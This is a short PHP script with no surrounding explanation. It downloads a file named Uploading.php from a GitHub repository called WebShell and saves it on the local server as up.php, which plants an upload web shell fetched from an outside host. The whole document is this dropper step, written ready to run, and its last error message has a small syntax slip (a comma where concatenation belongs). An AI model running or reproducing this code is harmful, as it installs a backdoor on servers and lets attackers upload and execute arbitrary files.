$url = 'https://raw.githubusercontent.com/xl7dev/WebShell/master/Php/Uploading.php';

//Download the file using file_get_contents.
$downloadedFileContents = file_get_contents($url);

//Check to see if file_get_contents failed.
if($downloadedFileContents === false){
    throw new Exception('Failed to download file at: ' . $url);
}

//The path and filename that you want to save the file to.
$fileName = 'up.php';

//Save the data using file_put_contents.
$save = file_put_contents($fileName, $downloadedFileContents);

//Check to see if it failed to save or not.
if($save === false){
    throw new Exception('Failed to save file to: ' , $fileName);
}
